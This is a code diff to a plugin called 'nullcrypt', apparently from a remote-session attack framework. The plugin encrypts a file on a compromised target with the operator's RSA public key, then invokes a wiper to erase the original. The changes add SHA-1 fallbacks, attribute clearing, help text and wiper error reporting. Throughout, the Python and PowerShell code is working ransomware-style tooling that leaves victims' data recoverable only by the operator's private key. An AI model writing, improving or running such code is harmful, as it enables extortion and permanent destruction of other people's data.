@@ -22,23 +22,34 @@ Usage:
   run nullcrypt <remote_file> <local_public_key.pem>
   run nullcrypt <remote_file> pubkey=<local_public_key.pem|inline_pem>
   run nullcrypt <remote_file> <local_public_key.pem> out=<remote_output.nullcrypt>
+  run nullcrypt help
 
 Cryptography:
   - File data: AES-256-GCM (fast symmetric encryption)
-  - AES key:   RSA-OAEP with SHA-256 (only the matching private key can unwrap)
+  - AES key:   RSA-OAEP (SHA-256 preferred; SHA-1 fallback on older Windows .NET)
+  - Only the holder of the matching private key can decrypt the .nullcrypt file
 
 After encryption succeeds, the wiper plugin runs on the original file so only
 the .nullcrypt output remains on the target.
 
-Examples:
-  run nullcrypt C:\\Users\\Public\\secret.doc C:\\keys\\recipient.pub.pem
-  run nullcrypt /home/user/data.db ./operator_rsa.pub.pem
-  run nullcrypt /var/tmp/report.pdf pubkey=./key.pem out=/var/tmp/report.pdf.nullcrypt
-
-Generate a key pair (operator machine):
+Key pair generation (operator machine — OpenSSL):
   openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out nullcrypt_private.pem
   openssl pkey -in nullcrypt_private.pem -pubout -out nullcrypt_public.pem
+
+  Keep nullcrypt_private.pem offline and secret. Deploy only nullcrypt_public.pem
+  (or its path) when running nullcrypt on a session.
+
+Verify the public key (optional):
+  openssl pkey -in nullcrypt_public.pem -pubin -text -noout
+
+Examples:
+  run nullcrypt C:\\Users\\Public\\secret.doc C:\\keys\\nullcrypt_public.pem
+  run nullcrypt /home/user/data.db ./nullcrypt_public.pem
+  run nullcrypt /var/tmp/report.pdf pubkey=./nullcrypt_public.pem
+  run nullcrypt C:\\temp\\file.bin pubkey=C:\\keys\\nullcrypt_public.pem out=C:\\temp\\file.bin.nullcrypt
 """.strip()
+
+PLUGIN_INFO = NULLCRYPT_USAGE
 
 _NULLCRYPT_WARNING = (
     'DESTRUCTIVE: The original file will be encrypted, then securely wiped via wiper. '
@@ -102,6 +113,8 @@ def _rsa_components_from_pem(pem: str):
 
 
 def _parse_nullcrypt_args(args):
+    if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
+        return None, None, None, NULLCRYPT_USAGE
     if not args:
         return None, None, None, NULLCRYPT_USAGE
 
@@ -167,6 +180,7 @@ else:
         with open(key_path, 'wb') as fh:
             fh.write(aes_key)
 
+        wrap_alg = 'RSA-OAEP-SHA256'
         wrap = subprocess.run(
             ['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pk_path,
              '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha256',
@@ -174,6 +188,15 @@ else:
             capture_output=True,
             timeout=60,
         )
+        if wrap.returncode != 0:
+            wrap = subprocess.run(
+                ['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', pk_path,
+                 '-pkeyopt', 'rsa_padding_mode:oaep', '-pkeyopt', 'rsa_oaep_md:sha1',
+                 '-in', key_path],
+                capture_output=True,
+                timeout=60,
+            )
+            wrap_alg = 'RSA-OAEP-SHA1'
         if wrap.returncode != 0:
             err = wrap.stderr.decode('utf-8', 'ignore').strip() or 'openssl pkeyutl failed'
             raise RuntimeError(err)
@@ -199,7 +222,7 @@ else:
             "magic": "TRC2NULLCRYPT",
             "version": 1,
             "sym": "AES-256-GCM",
-            "wrap": "RSA-OAEP-SHA256",
+            "wrap": wrap_alg,
             "wrapped_key": base64.b64encode(wrapped_key).decode('ascii'),
             "iv": base64.b64encode(iv).decode('ascii'),
             "tag": base64.b64encode(tag).decode('ascii'),
@@ -219,7 +242,7 @@ else:
             "output": out_path,
             "size": size,
             "output_size": os.path.getsize(out_path) if verified else 0,
-            "algorithm": "AES-256-GCM + RSA-OAEP-SHA256",
+            "algorithm": "AES-256-GCM + " + wrap_alg,
             "sha256": digest,
             "verified": verified,
             "platform": platform.system(),
@@ -246,6 +269,7 @@ try {{
   if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {{
     throw 'File not found or not a regular file'
   }}
+  try {{ [IO.File]::SetAttributes($path,[IO.FileAttributes]::Normal) }} catch {{}}
   $size=(Get-Item -LiteralPath $path).Length
   $plain=[IO.File]::ReadAllBytes($path)
   $sha=[System.Security.Cryptography.SHA256]::Create().ComputeHash($plain)
@@ -261,7 +285,13 @@ try {{
   $rsaParams.Exponent=[Convert]::FromBase64String($eB64)
   $rsa=[System.Security.Cryptography.RSA]::Create()
   $rsa.ImportParameters($rsaParams)
-  $wrappedKey=$rsa.Encrypt($key,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
+  $wrapAlg='RSA-OAEP-SHA256'
+  try {{
+    $wrappedKey=$rsa.Encrypt($key,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
+  }} catch {{
+    $wrappedKey=$rsa.Encrypt($key,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
+    $wrapAlg='RSA-OAEP-SHA1'
+  }}
 
   $sym='AES-256-GCM'
   $tag=$null
@@ -294,7 +324,7 @@ try {{
     magic='TRC2NULLCRYPT'
     version=1
     sym=$sym
-    wrap='RSA-OAEP-SHA256'
+    wrap=$wrapAlg
     wrapped_key=[Convert]::ToBase64String($wrappedKey)
     iv=[Convert]::ToBase64String($iv)
     tag=[Convert]::ToBase64String($tag)
@@ -319,8 +349,8 @@ try {{
   $result.output=$outPath
   $result.size=$size
   $result.output_size=(Get-Item -LiteralPath $outPath).Length
-  $result.algorithm='AES-256-GCM + RSA-OAEP-SHA256'
-  if ($sym -ne 'AES-256-GCM') {{ $result.algorithm='AES-256-CBC+HMAC-SHA256 + RSA-OAEP-SHA256' }}
+  $result.algorithm='AES-256-GCM + ' + $wrapAlg
+  if ($sym -ne 'AES-256-GCM') {{ $result.algorithm=$sym + ' + ' + $wrapAlg }}
   $result.sha256=$headerObj.sha256
   $result.verified=$verified
   $result.message='File encrypted; original ready for secure wipe'
@@ -334,7 +364,7 @@ Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
 @plugin.command(
     name='nullcrypt',
     platforms=['linux', 'windows', 'unix'],
-    description='Hybrid encrypt a remote file (AES-GCM + RSA) then securely wipe the original via wiper',
+    description='Hybrid encrypt a remote file (AES-GCM + RSA-OAEP) then wipe original. See: plugins info nullcrypt',
 )
 def run(session: SessionContext, args):
     remote_path, pubkey_ref, out_path, usage = _parse_nullcrypt_args(args)
@@ -402,15 +432,28 @@ def run(session: SessionContext, args):
     session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
 
     session.print('Invoking wiper on original file...', 'yellow')
-    wipe_rc = wiper_plugin.run(session, [remote_path])
+    session._handler._flush_shell(session._client_sock, timeout=3.0)
+    wipe_rc, wipe_data = wiper_plugin.run(
+        session,
+        [remote_path, 'method=quick'],
+        quiet=True,
+        return_result=True,
+    )
     data['wiped'] = wipe_rc == 0
+    if wipe_data:
+        data['wipe_detail'] = wipe_data.get('message') or wipe_data.get('error') or ''
+        data['wipe_steps'] = wipe_data.get('steps') or []
     final_report = format_nullcrypt_report(data, wiped=data['wiped'])
     session.print(final_report, 'cyan')
     session.log_command(f'run nullcrypt {remote_path}', final_report)
 
     if wipe_rc != 0:
+        detail = (wipe_data or {}).get('error') or 'unknown wiper failure'
+        if (wipe_data or {}).get('fallback_error'):
+            detail += f" (fallback: {wipe_data['fallback_error']})"
         session.print(
-            "Encryption succeeded but wiper failed — encrypted file exists; original may remain.",
+            f"Encryption succeeded but wiper failed — encrypted file exists; original may remain.\n"
+            f"Wiper detail: {detail}",
             'red',
         )
         return 1
